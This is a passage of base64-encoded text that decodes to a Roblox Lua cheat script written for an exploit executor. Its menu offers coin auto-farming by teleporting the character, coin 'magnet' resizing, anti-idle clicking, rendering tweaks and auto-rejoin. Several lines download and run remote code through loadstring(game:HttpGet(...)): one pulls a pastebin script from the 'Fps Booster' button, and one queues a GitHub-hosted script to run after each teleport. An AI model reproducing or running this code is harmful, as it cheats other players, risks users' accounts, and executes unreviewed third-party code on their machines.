FpcnMod29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgIGlmIHY6SXNBKCJQYXJ0aWNsZUVtaXR0ZXIiKSBvciB2OklzQSgiVHJhaWwiKSB0aGVuCiAgICAgICAgICAgICAgICBhZmZlY3RlZE9iamVjdHNbdl0gPSB2LkVuYWJsZWQKICAgICAgICAgICAgICAgIHYuRW5hYmxlZCA9IGZhbHNlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZWxzZQogICAgICAgIGxpZ2h0aW5nLkdsb2JhbFNoYWRvd3MgPSB0cnVlCiAgICAgICAgbGlnaHRpbmcuRm9nRW5kID0gMTAwMDAwCiAgICAgICAgCiAgICAgICAgZm9yIG9iaiwgd2FzRW5hYmxlZCBpbiBwYWlycyhhZmZlY3RlZE9iamVjdHMpIGRvCiAgICAgICAgICAgIGlmIG9iaiBhbmQgb2JqLlBhcmVudCB0aGVuCiAgICAgICAgICAgICAgICBvYmouRW5hYmxlZCA9IHdhc0VuYWJsZWQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgYWZmZWN0ZWRPYmplY3RzID0ge30KICAgIGVuZAplbmQpCgpMaWJyYXJ5LmFkZEJ1dHRvbih0YWIxMCwgIkZwcyBCb29zdGVyIChtYXliZSBtb3JlIGxhZyB0aGFuIG5vcm1hbCkiLCAiZnBzIHJlZnVlcnpvICh0YWx2ZXogZGUgbcOhcyBsYWcgZGUgbG8gbm9ybWFsKSIsIGZ1bmN0aW9uKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy94VzQxYVZrdCIpKSgpCmVuZCkKCkxpYnJhcnkuYWRkQnV0dG9uKHRhYjEwLCAibG93ZXIgY3B1IGxvYWQiLCAiIiwgZnVuY3Rpb24oKQpsb2NhbCBEPXtUPWZhbHNlLFY9dHJ1ZSxQPXRydWUsUHQ9dHJ1ZSxTPXRydWV9CmxvY2FsIEU9e0Y9dHJ1ZX0KbG9jYWwgSXRlbXM9e30KZm9yIF8sdiBpbiBuZXh0LGdhbWU6R2V0RGVzY2VuZGFudHMoKWRvCiAgICBpZiBELlAgYW5kKHY6SXNBKCJQYXJ0IilvciB2OklzQSgiVW5pb24iKW9yIHY6SXNBKCJCYXNlUGFydCIpKXRoZW4KICAgICAgICB2Lk1hdGVyaWFsPUVudW0uTWF0ZXJpYWwuU21vb3RoUGxhc3RpYwogICAgICAgIHRhYmxlLmluc2VydChJdGVtcyx2KQogICAgZW5kCiAgICBpZiBELlB0IGFuZCh2OklzQSgiUGFydGljbGVFbWl0dGVyIilvciB2OklzQSgiU21va2UiKW9yIHY6SXNBKCJFeHBsb3Npb24iKW9yIHY6SXNBKCJTcGFya2xlcyIpb3IgdjpJc0EoIkZpcmUiKSl0aGVuCiAgICAgICAgdi5FbmFibGVkPWZhbHNlCiAgICAgICAgdGFibGUuaW5zZXJ0KEl0ZW1zLHYpCiAgICBlbmQKICAgIGlmIEQuViBhbmQodjpJc0EoIkJsb29tRWZmZWN0IilvciB2OklzQSgiQmx1ckVmZmVjdCIpb3IgdjpJc0EoIkRlcHRoT2ZGaWVsZEVmZmVjdCIpb3IgdjpJc0EoIlN1blJheXNFZmZlY3QiKSl0aGVuCiAgICAgICAgdi5FbmFibGVkPWZhbHNlCiAgICAgICAgdGFibGUuaW5zZXJ0KEl0ZW1zLHYpCiAgICBlbmQKICAgIGlmIEQuVCBhbmQodjpJc0EoIkRlY2FsIilvciB2OklzQSgiVGV4dHVyZSIpKXRoZW4KICAgICAgICB2LlRleHR1cmU9IiIKICAgICAgICB0YWJsZS5pbnNlcnQoSXRlbXMsdikKICAgIGVuZAogICAgaWYgRC5TIGFuZCB2OklzQSgiU2t5Iil0aGVuCiAgICAgICAgdi5QYXJlbnQ9bmlsCiAgICAgICAgdGFibGUuaW5zZXJ0KEl0ZW1zLHYpCiAgICBlbmQKZW5kCmlmIEUuRiB0aGVuCiAgICBnYW1lLkxpZ2h0aW5nLkJyaWdodG5lc3M9LTEKICAgIGdhbWUuTGlnaHRpbmcuT3V0ZG9vckFtYmllbnQ9Q29sb3IzLmZyb21SR0IoMjU1LDI1NSwyNTUpCmVuZAplbmQpCgpnZXRnZW52KCkuRDNSID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLlIgb3IgZmFsc2UKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjUsICJEaXNhYmxlIDNEIHJlbmRlcmluZyIsICJEZXNhYmlsaXRhciAzZCByZW5kZXJpemFuZG8iLCBnZXRnZW52KCkuc2F2ZWRDb25maWcuUiBvciBmYWxzZSwgZnVuY3Rpb24ocykKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5SID0gcwogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQoKICAgIGlmIG5vdCBnZXRnZW52KCkuRDNSIGFuZCBzIHRoZW4KICAgICAgICBnZXRnZW52KCkuRDNSID0gdHJ1ZQogICAgICAgIFJ1blNlcnZpY2U6U2V0M2RSZW5kZXJpbmdFbmFibGVkKGZhbHNlKQogICAgZWxzZWlmIGdldGdlbnYoKS5EM1IgYW5kIG5vdCBzIHRoZW4KICAgICAgICBnZXRnZW52KCkuRDNSID0gZmFsc2UKICAgICAgICBSdW5TZXJ2aWNlOlNldDNkUmVuZGVyaW5nRW5hYmxlZCh0cnVlKQogICAgZW5kCmVuZCkKCkxpYnJhcnkuYWRkTGFiZWwodGFiNSwgInR3ZWVuIGF1dG9mYXJtIikKCmxvY2FsIFR3ZWVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIikKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIFJ1blNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQpsb2NhbCBWaXJ0dWFsVXNlciA9IGdhbWU6R2V0U2VydmljZSgiVmlydHVhbFVzZXIiKQpsb2NhbCBscCA9IGNsb25lcmVmKFBsYXllcnMuTG9jYWxQbGF5ZXIpCgpsb2NhbCBjb25uSWRsZWQsIGNvbm5EZXNjQWRkZWQsIGNvbm5DaGFyQWRkZWQsIGNvbm5IZWFydGJlYXQKCmxvY2FsIGZsb2F0UGFydCwgY3VyQ29udApsb2NhbCB2aXNpdGVkID0ge30KbG9jYWwgbW92aW5nLCBsYXN0VFAgPSBmYWxzZSwgMAoKZ2V0Z2VudigpLkF1dG9GYXJtRW5hYmxlZCAgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcuQXV0b0Zhcm1FbmFibGVkICBvciBmYWxzZQpnZXRnZW52KCkuUmVzZXRCYWdXaGVuRnVsbCA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5SZXNldEJhZ1doZW5GdWxsIG9yIGZhbHNlCmdldGdlbnYoKS5SYW5kb21Db2luICAgICAgID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLlJhbmRvbUNvaW4gICAgICAgb3IgZmFsc2UKZ2V0Z2VudigpLlR3ZWVuU3BlZWQgICAgICAgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcuVHdlZW5TcGVlZCAgICAgICBvciAyNApnZXRnZW52KCkuQ29pbkRlbGF5ICAgICAgICA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5Db2luRGVsYXkgICAgICAgIG9yIDAuMwpnZXRnZW52KCkuQXV0b0Zhcm1Nb2RlICAgICA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5BdXRvRmFybU1vZGUgICAgIG9yICJCZWxvdyB0aGUgbWFwIgoKbG9jYWwgcm9sZXMgPSB7fQpyb2xlcy50ID0geyBbbHAuTmFtZV0gPSB7IERlYWQgPSBmYWxzZSB9IH0KZnVuY3Rpb24gcm9sZXM6SXNBbGl2ZShwKQogICAgbG9jYWwgZCA9IHNlbGYudFtwLk5hbWVdCiAgICByZXR1cm4gZCBhbmQgbm90IGQuRGVhZAplbmQKCmNvbm5JZGxlZCA9IFBsYXllcnMuTG9jYWxQbGF5ZXIuSWRsZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICBWaXJ0dWFsVXNlcjpDYXB0dXJlQ29udHJvbGxlcigpCiAgICBWaXJ0dWFsVXNlcjpDbGlja0J1dHRvbjIoVmVjdG9yMi5uZXcoMCwwKSkKZW5kKQoKbG9jYWwgZnVuY3Rpb24gY2xlYXJGbG9hdCgpCiAgICBpZiBmbG9hdFBhcnQgdGhlbgogICAgICAgIGZsb2F0UGFydDpEZXN0cm95KCkKICAgICAgICBmbG9hdFBhcnQgPSBuaWwKICAgIGVuZAogICAgdmlzaXRlZCA9IHt9CiAgICBjdXJDb250ID0gbmlsCmVuZAoKbG9jYWwgZnVuY3Rpb24gZ2V0Q29pbnMoKQogICAgbG9jYWwgY29pbnMgPSB7fQogICAgaWYgY3VyQ29udCB0aGVuCiAgICAgICAgZm9yIF8sIGMgaW4gaXBhaXJzKGN1ckNvbnQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgYzpJc0EoIkJhc2VQYXJ0IikgYW5kIG5vdCB2aXNpdGVkW2NdIHRoZW4KICAgICAgICAgICAgICAgIGMuU2l6ZSA9IFZlY3RvcjMubmV3KDUsNiw1KQogICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGNvaW5zLCBjKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIGNvaW5zCmVuZAoKbG9jYWwgZnVuY3Rpb24gZ2V0UmFuZG9tQ29pbigpCiAgICBsb2NhbCBuZWFyID0ge30KICAgIGZvciBfLCBjb2luIGluIGlwYWlycyhnZXRDb2lucygpKSBkbwogICAgICAgIGlmIChjb2luLlBvc2l0aW9uIC0gZmxvYXRQYXJ0LlBvc2l0aW9uKS5NYWduaXR1ZGUgPD0gODAgdGhlbgogICAgICAgICAgICB0YWJsZS5pbnNlcnQobmVhciwgY29pbikKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuICNuZWFyID4gMCBhbmQgbmVhclttYXRoLnJhbmRvbSgjbmVhcildIG9yIG5pbAplbmQKCmxvY2FsIGZ1bmN0aW9uIGdldE5leHQoKQogICAgaWYgZ2V0Z2VudigpLlJhbmRvbUNvaW4gdGhlbgogICAgICAgIHJldHVybiBnZXRSYW5kb21Db2luKCkKICAgIGVsc2UKICAgICAgICBsb2NhbCBiZXN0LCBkaXN0CiAgICAgICAgZm9yIF8sIGNvaW4gaW4gaXBhaXJzKGdldENvaW5zKCkpIGRvCiAgICAgICAgICAgIGxvY2FsIGQgPSAoY29pbi5Qb3NpdGlvbiAtIGZsb2F0UGFydC5Qb3NpdGlvbikuTWFnbml0dWRlCiAgICAgICAgICAgIGlmIG5vdCBiZXN0IG9yIGQgPCBkaXN0IHRoZW4KICAgICAgICAgICAgICAgIGJlc3QsIGRpc3QgPSBjb2luLCBkCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHJldHVybiBiZXN0LCBkaXN0CiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBpc0Z1bGwoKQogICAgbG9jYWwgZ3VpID0gbHA6RmluZEZpcnN0Q2hpbGQoIlBsYXllckd1aSIpCiAgICBpZiBub3QgZ3VpIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgbG9jYWwgbWcgPSBndWk6RmluZEZpcnN0Q2hpbGQoIk1haW5HVUkiKQogICAgaWYgbm90IG1nIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgbG9jYWwgbGIgPSBtZzpGaW5kRmlyc3RDaGlsZCgiTG9iYnkiKQogICAgaWYgbm90IGxiIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgbG9jYWwgZGsgPSBsYjpGaW5kRmlyc3RDaGlsZCgiRG9jayIpCiAgICBpZiBub3QgZGsgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICBsb2NhbCBiZyA9IGRrOkZpbmRGaXJzdENoaWxkKCJDb2luQmFncyIpCiAgICBpZiBub3QgYmcgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICBsb2NhbCBjdCA9IGJnOkZpbmRGaXJzdENoaWxkKCJDb250YWluZXIiKQogICAgaWYgbm90IGN0IHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgbG9jYWwgYyA9IGN0OkZpbmRGaXJzdENoaWxkKCJDb2luIikKICAgIGlmIG5vdCBjIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgbG9jYWwgZiA9IGM6RmluZEZpcnN0Q2hpbGQoIkZ1bGwiKQogICAgaWYgbm90IGYgdGhlbiByZXR1cm4gZmFsc2UgZW5kCiAgICByZXR1cm4gZi5WaXNpYmxlCmVuZAoKbG9jYWwgZnVuY3Rpb24gbW92ZVRvKCkKICAgIGlmIG5vdCBnZXRnZW52KCkuQXV0b0Zhcm1FbmFibGVkIG9yIG5vdCBmbG9hdFBhcnQgdGhlbiByZXR1cm4gZW5kCiAgICBpZiBub3Qgcm9sZXM6SXNBbGl2ZShscCkgdGhlbiByZXR1cm4gZW5kCiAgICBpZiBpc0Z1bGwoKSB0aGVuCiAgICAgICAgaWYgZ2V0Z2VudigpLlJlc2V0QmFnV2hlbkZ1bGwgdGhlbgogICAgICAgICAgICBsb2NhbCBoID0gbHAuQ2hhcmFjdGVyIGFuZCBscC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgIGlmIGggdGhlbiBoLkhlYWx0aCA9IDAgZW5kCiAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBub3QgaXNGdWxsKCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIGNsZWFyRmxvYXQoKQogICAgICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnMod29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiB2OklzQSgiQmFzZVBhcnQiKSBhbmQgKHYuTmFtZT09IlNwYXduIiBvciB2Lk5hbWU9PSJQbGF5ZXJTcGF3biIpIGFuZCB2LlBhcmVudC5OYW1lfj0iTG9iYnkiIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBocnAgPSBscC5DaGFyYWN0ZXIgYW5kIGxwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgaWYgaHJwIHRoZW4gaHJwLkNGcmFtZSA9IENGcmFtZS5uZXcodi5Qb3NpdGlvbikgKiBDRnJhbWUubmV3KDAsMi41LDApIGVuZAogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIG1vdmluZyA9IHRydWUKICAgIGxvY2FsIGNvaW4sIGRpc3QgPSBnZXROZXh0KCkKICAgIGlmIG5vdCBjb2luIHRoZW4KICAgICAgICB2aXNpdGVkID0ge30KICAgICAgICBtb3ZpbmcgPSBmYWxzZQogICAgICAgIHJldHVybgogICAgZW5kCiAgICB2aXNpdGVkW2NvaW5dID0gdHJ1ZQogICAgbG9jYWwgeSA9IChnZXRnZW52KCkuQXV0b0Zhcm1Nb2RlID09ICJCZWxvdyB0aGUgbWFwIikgYW5kIC0zLjMgb3IgMQogICAgbG9jYWwgdGFyZ2V0ID0gY29pbi5Qb3NpdGlvbiArIFZlY3RvcjMubmV3KDAsIHksIDApCiAgICBkaXN0ID0gZGlzdCBvciAodGFyZ2V0IC0gZmxvYXRQYXJ0LlBvc2l0aW9uKS5NYWduaXR1ZGUKICAgIGlmIGRpc3QgPiA5MCB0aGVuCiAgICAgICAgaWYgdGljaygpIC0gbGFzdFRQID49IDMgdGhlbgogICAgICAgICAgICBsb2NhbCBocnAgPSBscC5DaGFyYWN0ZXIgYW5kIGxwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGlmIGhycCB0aGVuIGhycC5DRnJhbWUgPSBDRnJhbWUubmV3KHRhcmdldCkgZW5kCiAgICAgICAgICAgIGxhc3RUUCA9IHRpY2soKQogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdChnZXRnZW52KCkuQ29pbkRlbGF5KQogICAgICAgIG1vdmluZyA9IGZhbHNlCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGxvY2FsIHR3ZWVuID0gVHdlZW5TZXJ2aWNlOkNyZWF0ZShmbG9hdFBhcnQsIFR3ZWVuSW5mby5uZXcoZGlzdC9nZXRnZW52KCkuVHdlZW5TcGVlZCwgRW51bS5FYXNpbmdTdHlsZS5MaW5lYXIpLCB7UG9zaXRpb24gPSB0YXJnZXR9KQogICAgdHdlZW4uQ29tcGxldGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIHRhc2sud2FpdChnZXRnZW52KCkuQ29pbkRlbGF5KQogICAgICAgIG1vdmluZyA9IGZhbHNlCiAgICBlbmQpCiAgICB0d2VlbjpQbGF5KCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBzdGFydENvbm5lY3Rpb25zKCkKICAgIGNvbm5EZXNjQWRkZWQgPSB3b3Jrc3BhY2UuRGVzY2VuZGFudEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oaW5zdCkKICAgICAgICBpZiBnZXRnZW52KCkuQXV0b0Zhcm1FbmFibGVkIGFuZCBpbnN0Lk5hbWU9PSJDb2luQ29udGFpbmVyIiBhbmQgaW5zdH49Y3VyQ29udCB0aGVuCiAgICAgICAgICAgIGN1ckNvbnQgPSBpbnN0CiAgICAgICAgICAgIGNsZWFyRmxvYXQoKQogICAgICAgICAgICBsb2NhbCBocnAgPSBscC5DaGFyYWN0ZXIgYW5kIGxwLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGlmIGhycCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBmb2xkZXIgPSBJbnN0YW5jZS5uZXcoIkZvbGRlciIsIHdvcmtzcGFjZSkKICAgICAgICAgICAgICAgIGZsb2F0UGFydCA9IEluc3RhbmNlLm5ldygiUGFydCIsIGZvbGRlcikKICAgICAgICAgICAgICAgIGZsb2F0UGFydC5TaXplID0gVmVjdG9yMy5uZXcoMSwxLDEpCiAgICAgICAgICAgICAgICBmbG9hdFBhcnQuVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgZmxvYXRQYXJ0LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgICAgICAgICAgZmxvYXRQYXJ0Lk1hc3NsZXNzID0gdHJ1ZQogICAgICAgICAgICAgICAgZmxvYXRQYXJ0LkNhbkNvbGxpZGUgPSB0cnVlCiAgICAgICAgICAgICAgICBmbG9hdFBhcnQuQ2FzdFNoYWRvdyA9IGZhbHNlCiAgICAgICAgICAgICAgICBmbG9hdFBhcnQuQ0ZyYW1lID0gaHJwLkNGcmFtZSAqIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoOTApLDAsMCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICBjb25uQ2hhckFkZGVkID0gbHAuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChjbGVhckZsb2F0KQogICAgY29ubkhlYXJ0YmVhdCA9IFJ1blNlcnZpY2UuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIGlmIG5vdCBnZXRnZW52KCkuQXV0b0Zhcm1FbmFibGVkIG9yIG5vdCBmbG9hdFBhcnQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgbG9jYWwgaHJwID0gbHAuQ2hhcmFjdGVyIGFuZCBscC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGlmIGhycCB0aGVuCiAgICAgICAgICAgIGxvY2FsIGJ2ID0gaHJwOkZpbmRGaXJzdENoaWxkKCJCb2R5VmVsb2NpdHkiKQogICAgICAgICAgICBpZiBidiB0aGVuIGJ2OkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgaHJwLkNGcmFtZSA9IGZsb2F0UGFydC5DRnJhbWUKICAgICAgICBlbmQKICAgICAgICBpZiBub3QgbW92aW5nIHRoZW4gbW92ZVRvKCkgZW5kCiAgICBlbmQpCmVuZAoKbG9jYWwgZnVuY3Rpb24gc3RvcENvbm5lY3Rpb25zKCkKICAgIGlmIGNvbm5EZXNjQWRkZWQgdGhlbiBjb25uRGVzY0FkZGVkOkRpc2Nvbm5lY3QoKSBlbmQKICAgIGlmIGNvbm5DaGFyQWRkZWQgdGhlbiBjb25uQ2hhckFkZGVkOkRpc2Nvbm5lY3QoKSBlbmQKICAgIGlmIGNvbm5IZWFydGJlYXQgdGhlbiBjb25uSGVhcnRiZWF0OkRpc2Nvbm5lY3QoKSBlbmQKICAgIGNsZWFyRmxvYXQoKQplbmQKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjUsICJBdXRvIEZhcm0iLCAiIiwgZ2V0Z2VudigpLkF1dG9GYXJtRW5hYmxlZCwgZnVuY3Rpb24ob24pCiAgICBnZXRnZW52KCkuQXV0b0Zhcm1FbmFibGVkID0gb24KICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5BdXRvRmFybUVuYWJsZWQgPSBvbgogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQogICAgaWYgb24gdGhlbiBzdGFydENvbm5lY3Rpb25zKCkgZWxzZSBzdG9wQ29ubmVjdGlvbnMoKSBlbmQKZW5kKQoKTGlicmFyeS5hZGRUb2dnbGUodGFiNSwgIlJlc2V0QmFnV2hlbkZ1bGwiLCAiIiwgZ2V0Z2VudigpLlJlc2V0QmFnV2hlbkZ1bGwsIGZ1bmN0aW9uKG9uKQogICAgZ2V0Z2VudigpLlJlc2V0QmFnV2hlbkZ1bGwgPSBvbgogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLlJlc2V0QmFnV2hlbkZ1bGwgPSBvbgogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWI1LCAiUmFuZG9tIENvaW4iLCAiIiwgZ2V0Z2VudigpLlJhbmRvbUNvaW4sIGZ1bmN0aW9uKG9uKQogICAgZ2V0Z2VudigpLlJhbmRvbUNvaW4gPSBvbgogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLlJhbmRvbUNvaW4gPSBvbgogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCgpMaWJyYXJ5LmFkZFNsaWRlcih0YWI1LCAiVHdlZW4gU3BlZWQiLCAiIiwgMSwgMzAsIGdldGdlbnYoKS5Ud2VlblNwZWVkLCBmdW5jdGlvbih2KQogICAgZ2V0Z2VudigpLlR3ZWVuU3BlZWQgPSB2CiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuVHdlZW5TcGVlZCA9IHYKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKZW5kKQoKTGlicmFyeS5hZGRTbGlkZXIodGFiNSwgIkRlbGF5IHRvIG1vdmUgdG8gdGhlIG5leHQgY29pbiIsICIiLCAwLCAyMCwgZ2V0Z2VudigpLkNvaW5EZWxheSAqIDEwLCBmdW5jdGlvbih2KQogICAgbG9jYWwgZCA9IHYvMTAKICAgIGdldGdlbnYoKS5Db2luRGVsYXkgPSBkCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuQ29pbkRlbGF5ID0gZAogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCgpMaWJyYXJ5LmFkZERyb3Bkb3duKHRhYjUsICJBdXRvZmFybSBNb2RlIiwgZ2V0Z2VudigpLkF1dG9GYXJtTW9kZSwgeyJOb3JtYWwiLCAiQmVsb3cgdGhlIG1hcCJ9LCBmdW5jdGlvbihvcHQpCiAgICBnZXRnZW52KCkuQXV0b0Zhcm1Nb2RlID0gb3B0CiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuQXV0b0Zhcm1Nb2RlID0gb3B0CiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCmVuZCkKCmdldGdlbnYoKS5BdXRvUmVqb2luID0gdHJ1ZQoKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICBsb2NhbCBjb25uZWN0ZWQgPSBmYWxzZQogICAgd2hpbGUgdGFzay53YWl0KDEpIGRvCiAgICAgICAgaWYgZ2V0Z2VudigpLkF1dG9SZWpvaW4gYW5kIG5vdCBjb25uZWN0ZWQgdGhlbgogICAgICAgICAgICBjb25uZWN0ZWQgPSB0cnVlCiAgICAgICAgICAgIGxvY2FsIGd1aSA9IGdhbWU6R2V0U2VydmljZSgiQ29yZUd1aSIpOldhaXRGb3JDaGlsZCgiUm9ibG94UHJvbXB0R3VpIiwgMikKICAgICAgICAgICAgaWYgZ3VpIHRoZW4KICAgICAgICAgICAgICAgIGdldGdlbnYoKS5yZWpvaW4gPSBndWkucHJvbXB0T3ZlcmxheS5DaGlsZEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hpbGQpCiAgICAgICAgICAgICAgICAgICAgaWYgY2hpbGQuTmFtZSA9PSAiRXJyb3JQcm9tcHQiCiAgICAgICAgICAgICAgICAgICAgICAgIGFuZCBjaGlsZDpGaW5kRmlyc3RDaGlsZCgiTWVzc2FnZUFyZWEiKQogICAgICAgICAgICAgICAgICAgICAgICBhbmQgY2hpbGQuTWVzc2FnZUFyZWE6RmluZEZpcnN0Q2hpbGQoIkVycm9yRnJhbWUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBxdWV1ZV9vbl90ZWxlcG9ydCgnbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ib3QxMjAwL00vcmVmcy9oZWFkcy9tYWluL00iKSkoKScpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiVGVsZXBvcnRTZXJ2aWNlIik6VGVsZXBvcnQoZ2FtZS5QbGFjZUlkKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpnZXRnZW52KCkubWNvaW4gPSBnZXRnZW52KCkuc2F2ZWRDb25maWcubWNvaW4gb3IgZmFsc2UKbG9jYWwgY29uCgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWI1LCAibWFnbmV0IGNvaW4iLCAiTW9uZWRhcyBpbcOhbiIsIGdldGdlbnYoKS5tY29pbiwgZnVuY3Rpb24ocykKICAgIGdldGdlbnYoKS5tY29pbiA9IHMKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5tY29pbiA9IHMKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKICAgIGxvY2FsIHNtID0gNC41CgogICAgbG9jYWwgZnVuY3Rpb24gY2hnQ29pblNpemUoYywgc3opCiAgICAgICAgaWYgbm90IGdldGdlbnYoKS5tY29pbiB0aGVuIHJldHVybiBlbmQKICAgICAgICBpZiBjOklzQSgiQmFzZVBhcnQiKSBhbmQgYy5OYW1lID09ICJDb2luX1NlcnZlciIgdGhlbgogICAgICAgICAgICBjLlNpemUgPSBzegogICAgICAgIGVuZAogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gdXBkQ29pbnMoc3opCiAgICAgICAgaWYgbm90IGdldGdlbnYoKS5tY29pbiB0aGVuIHJldHVybiBlbmQKICAgICAgICBmb3IgXywgbWRsIGluIGlwYWlycyh3b3Jrc3BhY2U6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgbG9jYWwgY2MgPSBtZGw6RmluZEZpcnN0Q2hpbGQoIkNvaW5Db250YWluZXIiKQogICAgICAgICAgICBpZiBjYyB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgYyBpbiBpcGFpcnMoY2M6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLm1jb2luIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgIGNoZ0NvaW5TaXplKGMsIHN6KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgaWYgcyB0aGVuCiAgICAgICAgdXBkQ29pbnMoVmVjdG9yMy5uZXcoc20sIHNtLCBzbSkpCiAgICAgICAgY29uID0gZ2FtZS5Xb3Jrc3BhY2UuRGVzY2VuZGFudEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oYykKICAgICAgICAgICAgaWYgbm90IGdldGdlbnYoKS5tY29pbiB0aGVuIHJldHVybiBlbm